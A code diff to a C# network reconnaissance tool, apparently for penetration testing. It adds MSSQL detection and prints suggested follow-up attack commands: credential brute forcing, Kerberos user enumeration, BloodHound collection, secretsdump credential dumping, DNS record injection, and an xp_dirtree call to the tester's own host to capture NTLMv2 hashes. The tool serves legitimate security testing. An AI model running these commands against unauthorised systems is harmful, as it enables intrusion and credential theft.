@@ -18,7 +18,7 @@ namespace Reecon
         public string FriendlyName = "";
     }
 
-    public class PortInfo
+    public static class PortInfo
     {
         // For later
         // PortName? PortType?
@@ -33,7 +33,7 @@ namespace Reecon
             HTTP,
             HTTPS,
             POP3,
-            RPCBind,
+            RpcBind,
             NETBIOS,
             IMAP,
             LDAP,
@@ -41,18 +41,18 @@ namespace Reecon
             Rsync,
             NFS,
             Squid,
-            MySQL,
+            MySql,
             SVN,
-            PostgreSQL,
+            PostgreSql,
             VNC,
-            WinRM,
+            WinRm,
             Redis,
             AJP13,
             Elasticsearch,
             Minecraft
         }
 
-        private static List<Port> PortInfoList = new();
+        private static readonly List<Port> PortInfoList = [];
 
         // Parse Ports.txt into useful information
         public static void LoadPortInfo()
@@ -77,7 +77,6 @@ namespace Reecon
                 List<string> portItems = portData.Replace("\r\n", "\n").Split('\n').ToList(); // OS Friendly File Split
                 foreach (string port in portItems)
                 {
-                    int splitItems = port.Split('|').Length;
                     string portNumber = port.Split('|')[0];
                     string portFileName = port.Split('|')[1];
                     string portFriendlyName = port.Split('|')[2];
@@ -209,6 +208,7 @@ namespace Reecon
                                 case "NETBIOS": portInfo = NetBios.GetInfo(target, port); break;
                                 case "IMAP": portInfo = Imap.GetInfo(target, port); break;
                                 case "LDAP": portInfo = Ldap.GetInfoAsync(target, port).GetAwaiter().GetResult(); break;
+                                case "MSSQL" : portInfo = Mssql.GetInfo(target, port); break;
                                 case "HTTPS": portInfo = Https.GetInfo(target, port); break;
                                 case "SMB": portInfo = Smb.GetInfo(target, port); break;
                                 case "Rsync": portInfo = Rsync.GetInfo(target, port); break;
@@ -509,7 +509,7 @@ namespace Reecon
                 }
                 // Telnet - Third can be a number of things depending on the protocol - Check Telnet.cs
                 
-                // TODO: This probably broke in the refactor - Need to verify 
+                // This probably broke in the refactor - Need to verify 
                 else if (bannerString.Length > 5 && bannerBytes[0] == 255 && bannerBytes[1] == 253)
                 {
                     unknownPortResult += $"Port {port} - Telnet".Recolor(Color.Green) + Environment.NewLine;
@@ -587,6 +587,9 @@ namespace Reecon
                 {
                     unknownPortResult += $"Port {port} - Unknown (Dumping possible outcomes)".Recolor(Color.Red) + Environment.NewLine;
                     // Truly unknown - Find the best result
+                    
+                    // We're using multiple banner checks, but we should only show the nmap message once if it has a response.
+                    bool showNmapResponse = false;
                     foreach (List<byte> theBanner in bannerList)
                     {
                         string bannerString = Encoding.UTF8.GetString(theBanner.ToArray());
@@ -600,9 +603,14 @@ namespace Reecon
                         }
                         else
                         {
-                            unknownPortResult += "- Unknown Response: -->" + theBanner + "<--" + Environment.NewLine;
-                            unknownPortResult += $"- TODO: nmap -sC -sV {target} -p{port}" + Environment.NewLine;
+                            unknownPortResult += "- Unknown Response: -->" + Encoding.UTF8.GetString(theBanner.ToArray()).Recolor(Color.Orange) + "<--" + Environment.NewLine;
+                            showNmapResponse = true;
                         }
+                    }
+
+                    if (showNmapResponse)
+                    {
+                        unknownPortResult += $"- TODO: nmap -sC -sV {target} -p{port}" + Environment.NewLine;
                     }
                 }
                 Console.WriteLine(unknownPortResult);
@@ -630,6 +638,7 @@ namespace Reecon
             else if (portName == "DNS")
             {
                 // TODO: https://svn.nmap.org/nmap/scripts/dns-nsid.nse
+                postScanActions += $"- Try list all records (Linux): dig @{target} domain.com any" + Environment.NewLine;
                 postScanActions += $"- Try a reverse lookup (Linux): dig @{target} -x {target}" + Environment.NewLine;
                 postScanActions += $"- Try a zone transfer (Linux): dig axfr domain.com @{target}" + Environment.NewLine;
                 postScanActions += $@"- Try add a custom record: echo -e 'server {target}\nzone domain.com\nupdate add custom-subdomain.domain.com 600 IN A YOUR_IP\nsend' | nsupdate" + Environment.NewLine;
@@ -656,7 +665,6 @@ namespace Reecon
                     {
                         // It's generally assumed that if 88 is up, 389 is up as well, although it could also be 3268
                         defaultNamingContext = Ldap.GetPlainDefaultNamingContextAsync(target, port).GetAwaiter().GetResult();
-                        ;
                     }
                     catch (Exception ex)
                     {
@@ -672,7 +680,7 @@ namespace Reecon
                     }
 
                     // Bloodhound Collection
-                    postScanActions += $"- Bloodhound Collection: nxc ldap {target} -u 'USERNAME' -p 'PASSWORD' --bloodhound --collection All --dns-server {target}" + Environment.NewLine;
+                    postScanActions += $"- LDAP - Bloodhound Collection: nxc ldap {target} -u 'USERNAME' -p 'PASSWORD' --bloodhound --collection All --dns-server {target}" + Environment.NewLine;
 
                     // Username enum
                     postScanActions += $"- Kerberos Username Enum: kerbrute userenum --dc {target} -d {defaultNamingContext} users.txt (Very very fast - Use xato and wait 10 minutes)" + Environment.NewLine;
@@ -690,6 +698,16 @@ namespace Reecon
                     // Post exploitation
                     postScanActions += $"- If you get details: python3 secretsdump.py usernameHere:\"passwordHere\"@{target} | grep :" + Environment.NewLine;
                 }
+            }
+            else if (portName == "MSSQL")
+            {
+                postScanActions += $"- MSSQL - Brute force creds: nxc mssql {target} -u users.txt -p pass.txt" + Environment.NewLine;
+                postScanActions += $"- MSSQL - Get Version: nxc mssql {target} -u 'username' -p 'password' -q 'SELECT @@VERSION;'" + Environment.NewLine;
+                postScanActions += $"- MSSQL - nxc mssql {target} -u 'username' -p 'password' -M mssql_priv" + Environment.NewLine;
+                postScanActions += $"- MSSQL - Nmap has more: sudo nmap {target} -p 1433 --script ms-sql-info" + Environment.NewLine;
+                postScanActions += $"- MSSQL - Connect: mssqlclient.py (-windows-auth is optional, but can be required) {target}/userHere:passHere@{target}" + Environment.NewLine;
+                postScanActions += $@"- MSSQL - If you connect, run responder, and try get the NTLMv2 hash: nxc mssql {target} -u 'username' -p 'password' --local-auth -q 'exec xp_dirtree ""\\YOUR_IP_HERE\test""' (hashcat -m 5600 - NOT -ssp hashes)" + Environment.NewLine;
+                postScanActions += @"- MSSQL - Explore the file system: exec xp_dirtree 'C:\',1,1" + Environment.NewLine;
             }
             else if (portName == "NETBIOS")
             {
@@ -714,14 +732,6 @@ namespace Reecon
                 postScanActions += $"- SMB - Testing passwords: nxc smb {target} -u users.txt -p passwords.txt" + Environment.NewLine;
                 postScanActions += $"- SMB - List Shares: smbclient -U validusername%validpass -L //{target}" + Environment.NewLine;
                 postScanActions += $"- SMB - Connect Share: smbclient -U validusername%validpass //{target}/shareName" + Environment.NewLine;
-            }
-            else if (port == 1433)
-            {
-                postScanActions += $"- MSSQL - Nmap has more: sudo nmap {target} -p 1433 --script ms-sql-info" + Environment.NewLine;
-                postScanActions += $"- MSSQL - Brute force creds: nxc mssql {target} -u users.txt -p pass.txt" + Environment.NewLine;
-                postScanActions += $"- MSSQL - Connect: mssqlclient.py (-windows-auth is optional, but can be required) {target}/userHere:passHere@{target}" + Environment.NewLine;
-                postScanActions += @"- MSSQL - If you connect, run responder, and try get the NTLMv2 hash: exec xp_dirtree '\\yourip\anythinghere' (hashcat -m 5600 - NOT -ssp hashes)" + Environment.NewLine;
-                postScanActions += @"- MSSQL - Explore the file system: exec xp_dirtree 'C:\',1,1" + Environment.NewLine;
             }
             else if (port == 2049)
             {
@@ -793,13 +803,13 @@ namespace Reecon
             }
             else if (port == 4369)
             {
-                // TODO: https://svn.nmap.org/nmap/scripts/epmd-info.nse
+                // https://svn.nmap.org/nmap/scripts/epmd-info.nse
                 postScanActions += $"- EPMD: nmap {target} -p4369 --script=epmd-info -sV" + Environment.NewLine;
             }
             else if (port == 5222)
             {
-                // TODO: Jabber
-                // 5222/tcp open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
+                // Ignite Realtime Openfire Jabber server 3.10.0 or later
+                Console.WriteLine("Jabber - Do something about this");
             }
             else if (port == 5269)
             {
@@ -887,7 +897,10 @@ namespace Reecon
             {
                 // MongoDB
                 postScanActions += "- 27017 - MongoDB: NMap can get the version" + Environment.NewLine;
+                // We can somehow get the version and then check this - Maybe later.
+                postScanActions += "-- CVE-2025-14847 - MongoBleed" + Environment.NewLine;
                 // Nmap can get the version - What else can we get?
+
             }
             return postScanActions;
         }
